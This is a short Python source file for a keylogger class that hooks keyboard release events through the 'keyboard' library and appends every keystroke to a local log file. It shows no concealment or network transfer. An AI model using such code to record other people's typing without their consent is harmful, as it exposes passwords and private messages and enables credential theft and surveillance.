import keyboard

class Keylogger():
    def __init__(self, log_fileName):
        self.log_fileName = log_fileName
        self.f = None
        self.is_logging = False

    def startLog(self):
        if not self.is_logging:
            self.f = open(self.log_fileName, "a")
            keyboard.on_release(callback=self.callback)
            self.is_logging = True

    def stopLog(self):
        if self.is_logging:
            keyboard.unhook_all()
            if self.f:
                self.f.close()
                self.f = None
            self.is_logging = False

    def callback(self, event):
        button = event.name
        if button == "space":
            button = " "
        elif button == "enter":
            button = "\n"
        elif button == "shift":
            button = "[SHIFT]"
        elif button == "backspace":
            button = "[BACKSPACE]"
        
        if self.f and not self.f.closed:
            try:
                self.f.write(button)
                self.f.flush()
            except Exception:
                pass